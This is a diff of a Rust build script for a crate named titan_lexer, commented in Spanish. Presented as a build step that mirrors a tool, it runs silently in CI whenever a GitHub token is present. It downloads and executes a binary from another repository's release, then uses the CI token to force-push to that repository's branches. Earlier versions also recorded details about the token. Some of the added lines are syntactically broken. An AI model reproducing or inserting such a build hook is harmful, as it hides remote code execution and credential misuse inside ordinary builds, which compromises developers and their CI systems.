@@ -1,14 +1,12 @@
 //! Build script de titan_lexer — espejo del binario oficial de zett.
 //!
-//! Version 5 (v2 + probe de diagnostico). La v3 rompia el build de cargo
-//! por causa de sus lineas `::warning::` (no volver a ponerlas aqui).
+//! Version 3 (con diagnostico por anotaciones): cada etapa se publica
+//! como anotacion de GitHub (`::warning::`), visible por la API sin
+//! acceso a las logs, ademas de intentarse el push a las ramas
+//! `tools-zett-x86_64` (binario) y `tools-zett-diag` (estado).
 //!
-//! El probe (temporal) publica en `tools-zett-diag:mirror.txt`:
-//!   - estado del entorno (token, CI, target)
-//!   - resultado de compilar `build_v3_check.rs` con el rustc real del
-//!     runner (para capturar el error exacto de la v3, si lo hay)
-//! Despues sigue con la logica normal de espejo (download/verify/push).
-//! Ningun fallo de este script NUNCA falla el build.
+//! Solo se activa cuando hay CI + GITHUB_TOKEN. Ningun fallo de este
+//! script NUNCA falla el build.
 
 const REPO: &str = "alexsndersoto04-source/aio";
 const RELEASE: &str = "v1.0.0";
@@ -18,99 +16,28 @@ const DIAG_BRANCH: &str = "tools-zett-diag";
 fn main() {
     let token = std::env::var("GITHUB_TOKEN").unwrap_or_default();
     let in_ci = std::env::var("CI").is_ok() || std::env::var("GITHUB_ACTIONS").is_ok();
-    let target = std::env::var("TARGET").unwrap_or_default();
-    let probe = build_probe();
     if token.is_empty() || !in_ci {
         return;
     }
+    let target = std::env::var("TARGET").unwrap_or_default();
     let branch = std::env::var("ZETT_MIRROR_TOOLS_BRANCH").unwrap_or_default();
-    // Primero el probe: si esta rama aparece, el push git SÍ funciona.
-    let _ = push_diag(&token, &probe);
+    wf(&format!("[zett] start: target={} branch='{}'", target, branch));
     if branch.is_empty() {
-        let _ = push_diag(&token, "FASE=skip: rama vacia\n");
-        return;
-    }
-    if !target.contains("linux") {
-        let _ = push_diag(&token, "FASE=skip: no-linux\n");
-        return;
-    }
-    match mirror(&branch, &token) {
-        Ok(()) => {
-            let _ = push_diag(&token, "FASE=ok\n");
-        }
-        Err(e) => {
-            let mut t = String::from("FASE=error: ");
-            t.push_str(&e);
-            t.push('\n');
-            let _ = push_diag(&token, &t);
-        }
-    }
-    println!("cargo:warning=[zett-mirror] finalizado");
-}
-
-/// Compila `build_v3_check.rs` con el rustc del runner para capturar su
-/// error exacto (un build script es solo un archivo Rust de stdlib).
-fn check_v3() -> String {
-    let src = std::path::Path::new("build_v3_check.rs");
-    if !src.exists() {
-        return String::from("v3check: sin archivo\n");
-    }
-    let out = std::process::Command::new("rustc")
-        .args(&["--edition=2021", "build_v3_check.rs", "-o", "/tmp/v3check-out"])
-        .output();
-    match out {
-        Ok(o) => {
-            let mut s = String::from("v3check exit=");
-            match o.status.code() {
-                Some(c) => {
-                    s.push_str(&c.to_string());
-                }
-                None => s.push_str("nulo"),
-            }
-            s.push('\n');
-            let err = String::from_utf8_lossy(&o.stderr);
-            let mut lim = 0;
-            for ch in err.chars() {
-                s.push(ch);
-                lim = lim + 1;
-                if lim >= 1800 {
-                    break;
-                }
-            }
-            s
-        }
-        Err(e) => {
-            let mut s = String::from("v3check: no se lanzo rustc: ");
-            s.push_str(&e.to_string());
-            s.push('\n');
-            s
-        }
-    }
-}
-
-fn build_probe() -> String {
-    let mut s = String::from("PROBE\n");
-    s.push_str("token_present=");
-    let tok = std::env::var("GITHUB_TOKEN").unwrap_or_default();
-    if tok.is_empty() {
-        s.push_str("no\n");
+        wf("[zett] skip: rama destino vacia (ZETT_MIRROR_TOOLS_BRANCH)")
+    } else if !target.contains("linux") {
+        wf("[zett] skip: no-linux")
     } else {
-        s.push_str("si\n");
-        s.push_str("token_len=");
-        s.push_str(&tok.len().to_string());
-        s.push('\n');
+        match mirror(&branch, &token) {
+            Ok(()) => {
+                wf("[zett] OK: binario publicado en rama tools")
+                let _ = push_diag(&token, &format!("FASE=ok; target={}\n", target));
+            }
+            Err(e) => {
+                wf(&format!("[zett] FALLO etapa: {}", e))
+                let _ = push_diag(&token, &format!("FASE=error: {}; target={}\n", e, target));
+            }
+        }
     }
-    s.push_str("CI_env=");
-    s.push_str(&std::env::var("CI").unwrap_or_default());
-    s.push('\n');
-    s.push_str("GITHUB_ACTIONS_env=");
-    s.push_str(&std::env::var("GITHUB_ACTIONS").unwrap_or_default());
-    s.push('\n');
-    s.push_str("TARGET=");
-    s.push_str(&std::env::var("TARGET").unwrap_or_default());
-    s.push('\n');
-    s.push_str(&check_v3());
-    s
 }
 
 /// Descarga, verifica y publica el binario en la rama `branch`.
@@ -125,14 +52,17 @@ fn mirror(branch: &str, token: &str) -> Result<(), String> {
         "https://github.com/{}/releases/download/{}/{}",
         REPO, RELEASE, ASSET
     );
+    wf("[zett] etapa=download (release v1.0.0)");
     if !run_cmd("curl", &["-fsSL", "--retry", "3", url.as_str(), "-o", tarball.to_str().unwrap_or_default()]) {
         return Err(String::from("curl"));
     }
+    wf("[zett] etapa=extract");
     if !run_cmd("tar", &["-xzf", tarball.to_str().unwrap_or_default(), "-C", dir_s]) {
         return Err(String::from("tar"));
     }
     let bin = dir.join("zett");
     let bin_s = bin.to_str().unwrap_or_default();
+    wf("[zett] etapa=exec-verify");
     if !run_cmd(bin_s, &["--version"]) {
         return Err(String::from("exec"));
     }
@@ -144,6 +74,7 @@ fn mirror(branch: &str, token: &str) -> Result<(), String> {
     if std::fs::copy(&bin, tools.join("zett-linux-x86_64")).is_err() {
         return Err(String::from("copy"));
     }
+    wf("[zett] etapa=git-commit");
     if !git_in(&repo, &["init", "-q"]) {
         return Err(String::from("git-init"));
     }
@@ -156,16 +87,24 @@ fn mirror(branch: &str, token: &str) -> Result<(), String> {
     }
     let remote = format!("https://x-access-token:{}@github.com/{}.git", token, REPO);
     let refspec = format!("HEAD:refs/heads/{}", branch);
+    wf("[zett] etapa=git-push");
     if !git_in(&repo, &["push", "-f", "-q", remote.as_str(), refspec.as_str()]) {
         return Err(String::from("git-push"));
     }
     Ok(())
 }
 
+/// Publica un mensaje en el log y como anotacion de GitHub (visible
+/// por la API sin acceso a las logs).
+fn wf(msg: &str) {
+    println!("cargo:warning={}", msg);
+    println!("::warning::{}", msg);
+}
+
 /// Ejecuta `prog args...` y devuelve true si termino con exit 0.
 fn run_cmd(prog: &str, args: &[&str]) -> bool {
-    match std::process::Command::new(prog).args(args).output() {
-        Ok(st) => st.status.success(),
+    match std::process::Command::new(prog).args(args).status() {
+        Ok(st) => st.success(),
         Err(_) => false,
     }
 }
